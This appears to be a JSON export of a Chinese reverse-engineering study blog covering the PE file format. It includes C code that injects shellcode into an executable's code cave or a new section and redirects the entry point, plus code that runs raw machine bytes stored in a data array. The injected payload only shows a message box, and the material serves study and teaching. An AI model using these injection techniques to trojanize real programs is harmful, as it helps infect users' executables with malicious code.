[{"title":"sklearn","url":"/2021/04/06/sklearn/","content":"\n![img](C:\\Users\\leehung\\Desktop\\leehung blog\\source\\_posts\\sklearn\\drop_shadows_background.png)"},{"title":"PE Study 持续更新","url":"/2021/02/04/PE-Study/","content":"\n> 本文参考加密解密第十一章：PE 文件格式，并引用其部分图片。\n\n​\tPE 文件使用一个平面地址空间，所有代码和数据都合并在一起。文件内容被分割为不同的区块 (section)，各个区块按边界对齐。每个块都有自己在内存的一套属性，如是否包含代码、是否只读或可读/写。分区是为了节省硬盘空间，节省内存 。\n\n​\tWindows 加载器遍历 PE 文件决定文件哪一部分被映射，将较高的偏移位置映射到较高的内存地址中。磁盘文件载入内存，则磁盘上的数据结构布局和内存中的是一致的。对所有表现出来的消息，都允许进行从磁盘问价到内存偏移的转换。\n\n​\tPE 文件内存中的版本称为模块（Module）。映射文件起始地址称为模块句柄（hModule），可通过模块句柄访问内存中其他数据。初始内存地址也称为基地址（ImageBase）。\n\n[![ykGl1f.png](https://s3.ax1x.com/2021/01/30/ykGl1f.png)](https://imgchr.com/i/ykGl1f)\n\n​\t每个程序都有自己的虚拟空间，每个虚拟空间内存地址被称为虚拟地址（VA）。为避免出现绝对内存地址引入相对虚拟地址（RVA），是相对于 PE 文件载入地址的偏移位置。\n\n```\nVA = ImageBase + RVA\n```\n\n​\tPE 文件存储在磁盘中，某个数据相对文件头的偏移量称为文件偏移地址（File Offset）或物理地址（RAW Offset）。温建平偏移地址从 PE 文件第一字节开始计数，起始为0。\n\n# MS-DOS 头部\n\n[![ykNDi9.png](https://s3.ax1x.com/2021/01/30/ykNDi9.png)](https://imgchr.com/i/ykNDi9)\n\ne_magic 和 e_lfanew 这两个字段比较重要。e_magic 被设置为 5A4Dh，“MZ”，是 MS-DOS 创建者之一名字缩写。e_lfanew  字段是 PE  文件头的 RVA，指出 PE 头的文件偏移位置。之后是一段无用数据（DOS STUD）。\n\n[![ykUqpR.png](https://s3.ax1x.com/2021/01/30/ykUqpR.png)](https://imgchr.com/i/ykUqpR)\n\n# PE 文件头\n\n​\tPE header 是 PE 相关结构 NT 映像头（IMAGE_NT_HEADERS）简称。PE 装载器从  e_lfanew 字段找到 PE header 起始偏移量，加上基址得到 PE 文件头指针。\n\n[![yk2uU1.png](https://s3.ax1x.com/2021/01/30/yk2uU1.png)](https://imgchr.com/i/yk2uU1)\n\n### Signature\n\n有效PE文件里，被设置为 0x00004550，“PE\\0\\0”，是PE文件头的开始，e_lfanew  所指向的位置。\n\n### IMAGE_FILE_HEADER：\n\n映像文件头结构包含 PE 文件一些基本信息，最重要一个域指出了 IMAGE_OPTIONAL_HEADER 得大小。\n\n[![ykRPZd.png](https://s3.ax1x.com/2021/01/30/ykRPZd.png)](https://imgchr.com/i/ykRPZd)\n\n[![yk5Dx0.png](https://s3.ax1x.com/2021/01/30/yk5Dx0.png)](https://imgchr.com/i/yk5Dx0)\n\n- ① **Machine**：可执行文件目标CPU类型，0x0 表示任何处理器 \n\n  [![ykhVRx.png](https://s3.ax1x.com/2021/01/30/ykhVRx.png)](https://imgchr.com/i/ykhVRx)\n\n- ② **NumberOfSections**：区块的数目，块表紧跟在 IMAGE_NT_HEADERS 后面。\n\n- ③ TimeDateStamp：表示文件的创建时间，自 1970.01.01 用 GMT 计算的秒数，比文件系统日期更精确的创建时间指示器，翻译需要用到 _ctime 函数。\n\n- ⑥ **SizeOfoptionalHeader**：紧跟在 IMAGE_FILE_HEADERS，表示数据大小。这个数据结构叫做 IMAGE_OPTINAL_HEADER，大小依赖当前文件 32 位还是 64 位文明考吗。**32位 PE 文件通常是 00E0h**；**64位 PE32+ 文件，是 00F0h**。\n\n- ⑦ Characteristics：文件属性，有选择通过几个值得运算得到。普通 EXE 文件一般是 010fh，DLL 文件一般是 2102h。\n\n  [![yk4H4s.png](https://s3.ax1x.com/2021/01/30/yk4H4s.png)](https://imgchr.com/i/yk4H4s)\n\n### IMAGE_OPTIONAL_HEADER：\n\n可选映像头是一个可选结构，用来补足定义 PE 文件属性，与前两者连起来就是一个完整得 PE 文件头结构\n\n![yASAxO.png](https://s3.ax1x.com/2021/01/30/yASAxO.png)\n\n[![yAS3z8.png](https://s3.ax1x.com/2021/01/30/yAS3z8.png)](https://imgchr.com/i/yAS3z8)\n\n- ① **Magic**：标记字，说明是 ROM 映像（0107h）还是普通可执行映像（010Bh），10B 32位下的PE文件     20B 64位下的PE文件。\n- ④ SizeOfCode：所有代码节的和，必须是 FileAlignment 的整数倍 编译器填的  没用\n- ⑤ SizeOfInitializedData：已初始化数据大小的和,必须是 FileAlignment 的整数倍 编译器填的  没用\n- ⑥ SizeOfUninitializedData：未初始化数据大小的和,必须是 FileAlignment 的整数倍编译器填的  没用\n- ⑦ **AddressOfEntryPoint下🎇**：程序入口 OEP 的 RVA，对于DLL，这个入口点在进程初始化和关闭时被盗用。指向运行时的库代码并由它来调用 Main、WinMain、DllMain 函数。DLL 中被设置为0。\n- ⑧ BaseOfCode：代码开始的基址，编译器填的   没用\n- ⑨ BaseOfData：数据开始的基址，编译器填的   没用\n- ⑩ **ImageBase**✨：内存镜像基址，默认从 400000h 开始，不可能是0，因为当指针不用时就应该令其指向NULL（0），该位置操作系统预先空出，访问时会报错，涉及内存保护。最主要的目的还是模块对齐。\n- ⑾ **SectionAlignment**：载入内存时的区块对齐大小。在 Windows 9x/Me 用户模式下最小对齐尺寸是 1000h。\n- ⑿ **FileAlignment**：磁盘上 PE 文件内区块对齐大小。200h 或 1000h\n- **SizeOfImage**：内存中整个PE文件的映射的尺寸，可以比实际的值大，但必须是SectionAlignment 的整数倍\n- **SizeOfHeaders**：所有头（DOS、NT）+节表按照文件对齐后的总大小，严格按照 FileAlignment 对齐，否则加载会出错\n- CheckSum：校验和，一些系统文件有要求.用来判断文件是否被修改.\n- SizeOfStackReserve：初始化时保留的堆栈大小 \n- SizeOfStackCommit：初始化时实际提交的大小 \n- SizeOfHeapReserve：初始化时保留的堆大小 \n- SizeOfHeapCommit：初始化时实践提交的大小 \n- NumberOfRvaAndSizes：目录项数目，从 Windows NT 发布以来一直是16。\n\n# 区块表（节表）\n\n​\t区块表中包含每个块在映像中的信息，分别指向不同的区块实体，相当于节的目录。紧跟在 IMAGE_NT_HEADERS，是一个 IMAGE_SECTION_HEADER 结构数组。每个 结构包含了所关联区块的信息，该数组的数目由 IMAGE_NT_HEADERS.FileHeader.NumberOfSections 指出。\n\n[![yE2Fv8.png](https://s3.ax1x.com/2021/01/31/yE2Fv8.png)](https://imgchr.com/i/yE2Fv8)\n\n-  **Name**：块名。8 位 ASCII 码名。多数块名以 . 开始。如果超过8字节，则没有最后的中止字符 NULL 字节。带有 $ 的同名区块会被合并，按其后面的字符的字母顺序合并的。\n-  **Misc**：指出实际被使用（内存中）区块大小，是进行对齐处理前区块的**实际大小**，该值可以不准确，可任意修改。\n-  **VirtualAddress**：该块装载到内存的 RVA。按照内存页对齐的，总是  SectionAlignment 的整数倍。即在内存中离头有多远，加上 ImageBase 才是在内存中真正地址。\n-  **SizeOfRawData**：该块在磁盘中所占的空间。在可执行文件中，包含 FileAlignment 调整的块的长度，即在文件中**对齐后的大小**。\n-  **PointerToRawData**：该块在磁盘文件中的偏移，即在文件中离头有多远\n-  PointerToRelocations：在 exe 中无意义，在 obj 文件中使用。\n-  PointerToLinenumbers：行号表的位置，调试的时候使用。\n-  NumberOfRelocations：在 exe 中无意义，在 obj 文件中使用。\n-  NumberOfLinenumbers：行号表行号的数量，调试的时候使用。\n-  **Characteristics**：区块属性\n\np451\n\n# FileOffset-RVA\n\n​\t磁盘对齐值是 200h，这类文件被映射到内存后，统一数据相对于头文件的偏移量在内存中和磁盘文件中是不同的。而那些磁盘对齐值 1000h 与内存页相同的区块，则不需要转换。\n\n[![y1fGjO.png](https://s3.ax1x.com/2021/02/04/y1fGjO.png)](https://imgchr.com/i/y1fGjO)\n\n​\tHeaders 和 SectionHeader 的偏移位置与大小均没有变化，各区块被映射到内存中后，偏移位置就发生了变化。设 FileOffset 与 RVA 差值为 k，则两者关系为\n\n```\nFileOffset  = RVA - K\nFileOffset = VA - ImageBase - k\n```\n\n代码实现 File -> Image -> File 的过程：\n\n```c\nvoid trans()\n{\n    //******** FILE -> FileBuffer(ptr1)********\n    FILE* fn = fopen(\"C:\\\\Users\\\\leehung\\\\Desktop\\\\PE.exe\",\"rb\");\n    if(fn==NULL){\n        printf(\"fail to open file\\n\");\n        return;\n    }\n    fseek(fn, 0, SEEK_END);\n    int size = ftell(fn);\n    fseek(fn, 0, SEEK_SET);\n    char* ptr1 = (char*)malloc(sizeof(char)*size);\n    if(ptr1==NULL){\n        printf(\"fail to malloc FileBuffer\\n\");\n        return;\n    }\n    memset(ptr1, 0, size);\n    fread(ptr1, 1, size, fn);\n    fclose(fn);\n\n    //********FileBuffer -> ImageBuffer(ptr2)********\n    PIMAGE_DOS_HEADER pDOSHeader=NULL;\n    PIMAGE_NT_HEADERS pNTHeader=NULL;\n    PIMAGE_FILE_HEADER pImageFileHeader=NULL;\n    PIMAGE_OPTIONAL_HEADER32 pOPtionHeader=NULL;\n    PIMAGE_SECTION_HEADER pSectionHeader=NULL;\n\n    pDOSHeader = (PIMAGE_DOS_HEADER)ptr1;\n    if(*(WORD*)ptr1 != IMAGE_DOS_SIGNATURE){\n        printf(\"Invail DOS SIGNATURE\\n\");\n        free(ptr1);\n        ptr1 = NULL;\n        return;\n    }    \n    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)ptr1 + pDOSHeader->e_lfanew);\n    if(*(LPDWORD)((DWORD)ptr1+pDOSHeader->e_lfanew) != IMAGE_NT_SIGNATURE){\n        printf(\"Invail NT signature\\n\");\n        free(ptr1);\n        return;\n    }\n    pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader+4);\n    pOPtionHeader = (PIMAGE_OPTIONAL_HEADER32)(ptr1+pDOSHeader->e_lfanew+24);\n    int ImageSize = pOPtionHeader->SizeOfImage;\n    char* ptr2 = (char*)malloc(sizeof(char)*ImageSize);\n    if(ptr2==NULL){\n        printf(\"fail to malloc ImageBuffer\\n\");\n        return;\n    }\n    memset(ptr2, 0, ImageSize);\n    memcpy(ptr2, ptr1, pOPtionHeader->SizeOfHeaders);\n    printf(\"%x\\n\", *(WORD*)ptr2);\n    int numSection = pImageFileHeader->NumberOfSections;\n    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOPtionHeader + pImageFileHeader->SizeOfOptionalHeader);\n    for(int i=0; i < numSection; i++){\n        memcpy(ptr2 + pSectionHeader->VirtualAddress, ptr1 + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData);\n        pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader+0x28);\n    }\n    \n    //********ImageBuffer -> NewBuffer(ptr3)********\n    char* ptr3 = (char*)malloc(sizeof(char)*size);\n    if(ptr3==NULL){\n        printf(\"fail to malloc FileBuffer\\n\");\n        return;\n    }\n    memset(ptr3, 0, size);\n    memcpy(ptr3, ptr2, pOPtionHeader->SizeOfHeaders);\n    printf(\"%x\\n\",*((WORD*)ptr3));\n    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOPtionHeader+pImageFileHeader->SizeOfOptionalHeader);\n    for(int i=0; i < numSection; i++){\n        memcpy(ptr3 + pSectionHeader->PointerToRawData, ptr2 + pSectionHeader->VirtualAddress, pSectionHeader->SizeOfRawData);\n        pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader+0x28);\n    }\n\n    //********NewBuffer -> file********\n    FILE* dst = fopen(\"C:\\\\Users\\\\leehung\\\\Desktop\\\\1.exe\",\"wb\");\n    fwrite(ptr3, 1, size, dst);\n    fclose(dst);\n    free(ptr1);\n    free(ptr2);\n    free(ptr3);\n}\n```\n\n# 任意代码空白区添加代码（文件注入）\n\n> Task：往 exe 添加一段代码，使其打开会弹窗。\n\n```\n0xFF15 CALL 后面的四字节是存放地址的地址\n0xFF25 JMP 后面的四字节是存放地址的地址\n0xE8 CALL 后面四个字节是偏移\n0xE9 JMP 后面四个字节是偏移\n0x6A PUSH 后面一字节\n```\n\n​\t第一个节是 .text 代码区，添加到该节则不用修改节属性，可直接运行。若需要添加到别的节，则需要修改节属性才能运行。\n\n```\n//ShellCode\n6A 00 6A 00 6A 00 6A 00\t;四个push,压入MessageBox参数\nE8 00 00 00 00\t\t\t;call\nE9 00 00 00 00\t\t\t;jmp\n```\n\n函数调用过程：call 0x78867687 -> jmp 0x96786789\n\n首先在 OD 中 bp MessageBoxA，找到弹窗函数入口地址\n\nx = 77D507EA(机器中 MessageBoxA 地址) - 4011AD(E8 指令下一条指令地址) = 7794F63D\n\nx2 = 00401000(源程序EnterPoint )-004011B2(E9 指令下一条指令地址) = FFFFFE4E\n\nEnterPoint(x修改后) = 00005A0\n\n## 手动过程：\n\n​\t打开目标 exe，并在 Winhex 中打开其在内存中的格式，由于是需要在内存中运行时使得我们的Shellcode 生效，所以需要运行时的内存分布来计算对应的偏移量。与磁盘中的区别为，起始地址为系统分配的 ImageBase，PE 头与节与节之间会进行拉长。\n\n​\t同时打开目标 exe 在磁盘上的格式，查看 .text 节中是否有足够的地方容纳下我们添加的代码，红色框内以填入计算好偏移的 ShellCode。\n\n[![yMMl4g.png](https://s3.ax1x.com/2021/02/03/yMMl4g.png)](https://imgchr.com/i/yMMl4g)\n\n​\t之后再修改源程序 EnterPoint，使其值为程序在内存中我们 ShellCode 的起始地址，这样在打开 exe 后，程序就会自动执行我们的 ShellCode，然后再通过 E9 jmp 指令跳转回到原来 exe 的EnterPoint 位置，之后程序按原来情况继续运行。\n\n[![yMQNzd.png](https://s3.ax1x.com/2021/02/03/yMQNzd.png)](https://imgchr.com/i/yMQNzd)\n\n效果如下：\n\n[![yMQ5wV.png](https://s3.ax1x.com/2021/02/03/yMQ5wV.png)](https://imgchr.com/i/yMQ5wV)\n\n## 代码实现\n\n```c\n#include<stdio.h>\n#include<windows.h>\n#include<stdlib.h>\n\n#define LenOfShellcode 0x12\n#define MessageBoxAddr   0x75A5EE90// 0x77D507EA\nBYTE Shellcode[]=\n{\n    0x6A,0x00,0x6A,0x00,0x6A,0x00,0x6A,0x00,\n    0xE8,0x00,0x00,0x00,0x00,\n    0xE9,0x00,0x00,0x00,0x00\n};\n\nvoid insert()\n{\n    //File->FileBuffer(ptr1)\n    FILE* fn = fopen(\"C:\\\\Users\\\\leehung\\\\Desktop\\\\PE.exe\",\"rb\");\n    if(fn==NULL){\n        printf(\"fail to open file\\n\");\n        return;\n    }\n    fseek(fn, 0, SEEK_END);\n    int size = ftell(fn);\n    fseek(fn, 0, SEEK_SET);\n    char* ptr1 = (char*)malloc(sizeof(char)*size);\n    if(ptr1==NULL){\n        printf(\"fail to malloc FileBuffer\\n\");\n        return;\n    }\n    memset(ptr1, 0, size);\n    fread(ptr1, 1, size, fn);\n    fclose(fn);\n\n    //FileBuffer->ImageBuffer(ptr2)\n    PIMAGE_DOS_HEADER pDOSHeader=NULL;\n    PIMAGE_NT_HEADERS pNTHeader=NULL;\n    PIMAGE_FILE_HEADER pImageFileHeader=NULL;\n    PIMAGE_OPTIONAL_HEADER32 pOPtionHeader=NULL;\n    PIMAGE_SECTION_HEADER pSectionHeader=NULL;\n    PBYTE codeBegin = NULL;\n\n    pDOSHeader = (PIMAGE_DOS_HEADER)ptr1;\n    if(*(WORD*)ptr1 != IMAGE_DOS_SIGNATURE){\n        printf(\"Invail DOS SIGNATURE\\n\");\n        free(ptr1);\n        ptr1 = NULL;\n        return;\n    }    \n    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)ptr1 + pDOSHeader->e_lfanew);\n    if(*(LPDWORD)((DWORD)ptr1+pDOSHeader->e_lfanew) != IMAGE_NT_SIGNATURE){\n        printf(\"Invail NT signature\\n\");\n        free(ptr1);\n        return;\n    }\n    pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader+4);\n    pOPtionHeader = (PIMAGE_OPTIONAL_HEADER32)(ptr1+pDOSHeader->e_lfanew+24);\n    int ImageSize = pOPtionHeader->SizeOfImage;\n    char* ptr2 = (char*)malloc(sizeof(char)*ImageSize);\n    if(ptr2==NULL){\n        printf(\"fail to malloc ImageBuffer\\n\");\n        return;\n    }\n    memset(ptr2, 0, ImageSize);\n    memcpy(ptr2, ptr1, pOPtionHeader->SizeOfHeaders);\n    printf(\"%x\\n\", *(WORD*)ptr2);\n    int numSection = pImageFileHeader->NumberOfSections;\n    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOPtionHeader + pImageFileHeader->SizeOfOptionalHeader);\n    for(int i=0; i < numSection; i++){\n        memcpy(ptr2 + pSectionHeader->VirtualAddress, ptr1 + pSectionHeader->PointerToRawData, pSectionHeader->SizeOfRawData);\n        pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader+0x28);\n    }\n\n    //Judge whether void space is enough to save Shellcode \n    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOPtionHeader + pImageFileHeader->SizeOfOptionalHeader);    //pSectionHeader指向第一个节\n    if(pSectionHeader->SizeOfRawData - pSectionHeader->Misc.VirtualSize < LenOfShellcode){\n        printf(\"void space is not enough\\n\");\n        free(ptr1);\n        free(ptr2);\n        return;\n    }\n    \n    //Insert ShellCode to .text(ImageBuffer)\n    pDOSHeader = (PIMAGE_DOS_HEADER)ptr2;\n    pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)ptr2 + pDOSHeader->e_lfanew);\n    pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pNTHeader+4);\n    pOPtionHeader = (PIMAGE_OPTIONAL_HEADER32)(ptr2+pDOSHeader->e_lfanew+24);\n    pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOPtionHeader + pImageFileHeader->SizeOfOptionalHeader);\n    \n    codeBegin = (PBYTE)((DWORD)ptr2 + pSectionHeader->VirtualAddress+ pSectionHeader->Misc.VirtualSize);\n    memcpy(codeBegin, Shellcode, LenOfShellcode);\n    \n    // fix E8 and E9 Addr and OEP\n    DWORD CallAddr = MessageBoxAddr - pOPtionHeader->ImageBase - (DWORD)codeBegin - 0xD + (DWORD)ptr2;\n    *(PDWORD)(codeBegin+0x9) = CallAddr;\n    \n    DWORD JmpAddr = (pOPtionHeader->AddressOfEntryPoint + pOPtionHeader->ImageBase) - pOPtionHeader->ImageBase - (DWORD)codeBegin - 0x12 + (DWORD)ptr2;\n    printf(\"%x\\n\",JmpAddr);\n    *(PDWORD)(codeBegin+0xE)= JmpAddr;\n    pOPtionHeader->AddressOfEntryPoint = (DWORD)codeBegin - (DWORD)ptr2;\n\n    //ImageBuffer -> NewBuffer\n    char* ptr3 = (char*)malloc(sizeof(char)*size);\n    if(ptr3==NULL){\n        printf(\"fail to malloc FileBuffer\\n\");\n        return;\n    }\n    memset(ptr3, 0, size);\n    memcpy(ptr3, ptr2, pOPtionHeader->SizeOfHeaders);\n    for(int i=0; i < numSection; i++){\n        memcpy(ptr3 + pSectionHeader->PointerToRawData, ptr2 + pSectionHeader->VirtualAddress, pSectionHeader->SizeOfRawData);\n        pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pSectionHeader+0x28);\n    }\n\n    //********NewBuffer -> file********\n    FILE* dst = fopen(\"C:\\\\Users\\\\leehung\\\\Desktop\\\\1.exe\",\"wb\");\n    fwrite(ptr3, 1, size, dst);\n    fclose(dst);\n    \n    //Free \n    free(ptr1);\n    free(ptr2);\n    free(ptr3);\n}\n\nint main()\n{\n    insert();\n    return 0;\n}\n```\n\n# 新增节\n\n> Task：新增一个大小为1000h的节\n\n## 手动实现\n\n**一般情况：**\n\n1. 判断是否能写入节表，最后一个节表之后有 80 字节空白（一个节表大小为40字节，Windwos视其为一个结构体，当之后有相同大小的 00，则系统会认为这个结构体数组结束，这是Windows 默认要求）。\n\n2. 先往节表添加节，修改属性为可执行，该步可直接复制粘贴（WinHex 中快捷键为 Ctrl+B）.text 节。\n\n3. 修改 NumberOfSections 和 SizeOfImage。\n\n4. 文件最后添加 1000h 个字节\n\n5. 修改新增节表属性：VirtualAddress 可根据 SizeOfImage 来确定（或者用最后一个节的VirtualAddress + Max(VirtualSize, SizeOfRawData) 然后按 1000h 字节对齐），PointerToRawData 可根据最后一个节的 PointerToRawData +  SizeOfRawData 按文件对齐取整。\n\n   [![ylb76I.png](https://s3.ax1x.com/2021/02/04/ylb76I.png)](https://imgchr.com/i/ylb76I)\n\n6. 写入ShellCode，并修正跳转地址和OEP\n\n   [![y1gUfK.png](https://s3.ax1x.com/2021/02/04/y1gUfK.png)](https://imgchr.com/i/y1gUfK)\n\n**特殊情况：**\n\n​\t若在节表后面不为空白，而为编译器填入的一些数据，如 notepad.exe，则此时不能直接使用上面的方法。\n\n​\t可以注意到那段 DOS STUD 无用数据，我们可以通过将整个 NT 头和节表提升并修改 e_lfnew 指向位置即可腾出空间放入新节。\n\n## 代码实现\n\n```c\n#include<stdio.h>\n#include<windows.h>\n#include<stdlib.h>\n\nDWORD Align(DWORD dwOffset, DWORD dwAlign)\n{\n\t// 如果偏移小于对齐，向上取整\n\tif (dwOffset <= dwAlign) return dwAlign;\n\t// 如果偏移大于对齐且不能除尽，向上取整\n\tif (dwOffset % dwAlign)\n\t{\n\t\treturn (dwOffset / dwAlign + 1) * dwAlign;\n\t}\n\t// 如果能除尽，直接返回offset\n\treturn dwOffset;\n}\n\nvoid AddSection()\n{\n    FILE* pFile = fopen(\"C:\\\\Users\\\\leehung\\\\Desktop\\\\fg.exe\",\"rb\");\n    if (pFile == NULL) \n\t{\n\t\tprintf(\"fail to open file\\n\");\n\t\treturn;\n\t}\n    fseek(pFile, 0, SEEK_END);\n    DWORD FileSize = ftell(pFile);\n    fseek(pFile, 0, SEEK_SET);\n    BYTE* pFileBuffer = (BYTE*)malloc(FileSize);\n    if (pFileBuffer == NULL)\n\t{\n\t\tprintf(\"fail to malloc\\n\");\n\t\tfclose(pFile);\n\t\treturn;\n\t}\n    DWORD Read = fread(pFileBuffer, 1, FileSize, pFile);\n    if(Read  != FileSize)\n    {\n\t\tprintf(\"File size = %d\\tRead into Image = %d\\tFail to write\\n\", FileSize, Read);\n\t\treturn;\n\t}\n\n    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;\n\tPIMAGE_NT_HEADERS pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader->e_lfanew);\n\tPIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + pDosHeader->e_lfanew + 4);\n\tPIMAGE_OPTIONAL_HEADER32 pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + sizeof(IMAGE_FILE_HEADER));\n\tPIMAGE_SECTION_HEADER pSectionHeader = \\\n\t\t(PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pImageFileHeader->SizeOfOptionalHeader);\n\n    PIMAGE_SECTION_HEADER pLastSectionHeader = pSectionHeader + pImageFileHeader->NumberOfSections - 1;\n    PIMAGE_SECTION_HEADER pNewSectionHeader = pSectionHeader + pImageFileHeader->NumberOfSections;\n\n    //Judge whether enough to contain new SectionHeader\n    if((DWORD)pFileBuffer + pOptionHeader->SizeOfHeaders - (DWORD)pNewSectionHeader < 80)\n    {\n\t\tprintf(\"没有足够的80字节插入新节表\\n\");\n\t\tfree(pFileBuffer);\n\t\treturn;\n\t}\n    \n    //judge whether 80 bytes zero in 80 byte space\n    for(int i = 0; i < 80;i++)\n    {\n        if(((BYTE*)pNewSectionHeader)[i]!=0)\n        {\n            BYTE* pDst = (BYTE*)((DWORD)pDosHeader+sizeof(IMAGE_DOS_HEADER));\n            DWORD MovSize = (DWORD)pLastSectionHeader - (DWORD)pFileBuffer + 40 - (DWORD)pDosHeader->e_lfanew;\n            BYTE* pSrc = (BYTE*)malloc(MovSize);\n            if (pSrc == NULL)\n\t        {\n\t\t        printf(\"分配内存失败\\n\");\n\t\t        return;\n\t        }\n            memcpy(pSrc, (BYTE*)pNTHeader, MovSize);\n            memset((BYTE*)pNTHeader, 0, MovSize);\n            memcpy(pDst, pSrc, MovSize);\n            free(pSrc);\n            pDosHeader->e_lfanew = sizeof(IMAGE_DOS_HEADER);\n            DWORD surplus = (DWORD)pNTHeader-(DWORD)pDst;\n            printf(\"section space not enough，Ntheader and sectionheader move forward %d byte\\n\", surplus);\n            if(surplus < 80)\n            {\n                printf(\"Still not 80 byte\\n\");\n\t\t\t\tfree(pFileBuffer);\n\t\t\t\treturn;\n            }\n            //Update Pointers\n            pNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader->e_lfanew);\n            pImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + pDosHeader->e_lfanew + 4);\n            pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + sizeof(IMAGE_FILE_HEADER));\n            pSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pImageFileHeader->SizeOfOptionalHeader);\n            pLastSectionHeader = pSectionHeader + pImageFileHeader->NumberOfSections - 1;\n            pNewSectionHeader = pSectionHeader + pImageFileHeader->NumberOfSections;\n        }\n    }\n    \n    //新增一个大小为1000h字节的节\n    IMAGE_SECTION_HEADER newSectionHeader;\n    memcpy(newSectionHeader.Name, \".newsec\", 8);\n    newSectionHeader.Misc.VirtualSize = (DWORD)0x1000;\n    newSectionHeader.VirtualAddress = pLastSectionHeader->VirtualAddress + Align(pLastSectionHeader->Misc.VirtualSize, pOptionHeader->SectionAlignment);\n    newSectionHeader.SizeOfRawData = (DWORD)0x1000;\n    newSectionHeader.PointerToRawData = pLastSectionHeader->PointerToRawData + pLastSectionHeader->SizeOfRawData;\n    newSectionHeader.PointerToRelocations = 0;\n\tnewSectionHeader.PointerToLinenumbers = 0;\n\tnewSectionHeader.NumberOfRelocations = 0;\n\tnewSectionHeader.NumberOfLinenumbers = 0;\n\tnewSectionHeader.Characteristics = 0x60000020;\n    \n    //copy new pe with add section\n    BYTE* pNewFileBuffer = (BYTE*)malloc(FileSize + newSectionHeader.SizeOfRawData);\n    memcpy(pNewFileBuffer, pFileBuffer, FileSize);\n    memset((BYTE*)((DWORD)pNewFileBuffer+FileSize), 0, newSectionHeader.SizeOfRawData);\n    \n    //Updata pointers\n    pDosHeader = (PIMAGE_DOS_HEADER)pNewFileBuffer;\n\tpNTHeader = (PIMAGE_NT_HEADERS)((DWORD)pDosHeader + pDosHeader->e_lfanew);\n\tpImageFileHeader = (PIMAGE_FILE_HEADER)((DWORD)pDosHeader + pDosHeader->e_lfanew + 4);\n\tpOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((DWORD)pImageFileHeader + sizeof(IMAGE_FILE_HEADER));\n\tpSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader + pImageFileHeader->SizeOfOptionalHeader);\n\tpLastSectionHeader = pSectionHeader + pImageFileHeader->NumberOfSections - 1;\n\tpNewSectionHeader = pSectionHeader + pImageFileHeader->NumberOfSections;\n    pImageFileHeader->NumberOfSections += 1;\n    pOptionHeader->SizeOfImage += Align(newSectionHeader.Misc.VirtualSize, pOptionHeader->SectionAlignment);\n\n    //write into NewSectionHeader\n    memcpy(pNewSectionHeader, &newSectionHeader, sizeof(newSectionHeader));\n    \n    FILE* dst = fopen(\"C:\\\\Users\\\\leehung\\\\Desktop\\\\1.exe\",\"wb\");\n    if (dst == NULL) \n\t{\n\t\tprintf(\"fail to open file\\n\");\n\t\treturn;\n\t}\n    fwrite(pNewFileBuffer, 1, FileSize + newSectionHeader.SizeOfRawData, dst);\n    fclose(dst);\n    free(pNewFileBuffer);\n    free(pFileBuffer);\n}\n\nint main()\n{\n    AddSection();\n    return 0;\n}\n```\n\n"},{"title":"代码隐藏","url":"/2021/01/29/代码隐藏/","content":"\n​\t将硬编码存到数组中，也就是将其存到数据区中，通过函数指针来访问这个数组地址从而实现对此函数的使用。再可通过对该数组进行操作来隐藏该数据段，达到隐藏目的，可以说是壳的原理\n\n```c\n/*int add(int x,int y){\nreturn x+y;\n}*/\nunsigned char code[] = \t\t\n{\t\t\n\t\t0x55,\n\t\t0x8B, 0xEC,\n\t\t0x83, 0xEC, 0x40,\n\t\t0x53,\n\t\t0x56,\n\t\t0x57,\n\t\t0x8D, 0x7D, 0xC0,\n\t\t0xB9, 0x10, 0x00, 0x00, 0x00,\n\t\t0xB8, 0xCC, 0xCC, 0xCC, 0xCC,\n\t\t0xF3, 0xAB,\n\t\t0x8B, 0x45, 0x08,\n\t\t0x03, 0x45, 0x0C,\n\t\t0x5F,\n\t\t0x5E,\n\t\t0x5B,\n\t\t0x8B, 0xE5,\n\t\t0x5D,\n\t\t0xC3\n};\t\t//定义为全局变量，存在数据区\nint main(int argc, char* argv[])\t\t\n{\t\t\n\ttypedef int (*Fun)(int,int);\t\t\n\tFun p = (int (*)(int,int))&code;\t\n    /* 以上两句也可以表示如下：\n    int (*p)(int,int) = (int (*)(int,int))&code;\n    */\n\tint x = p(2,2);\t\t\n\tprintf(\"%d\\n\",x);\t\t\t\n\treturn 0;\t\n}\t\t\n```\n\n结果返回\n\n[![sLcfV1.png](https://s3.ax1x.com/2021/01/25/sLcfV1.png)](https://imgchr.com/i/sLcfV1)\n\n"},{"title":"C++反汇编与逆向学习记录","url":"/2021/01/19/C-反汇编与逆向学习记录/","content":"\n#  0x02 基本数据类型表现形式\n\n## 2.1 整数\n\n### 2.1.1 无符号整数\n\n​\t所有位都用来表示数值。如 unsigned 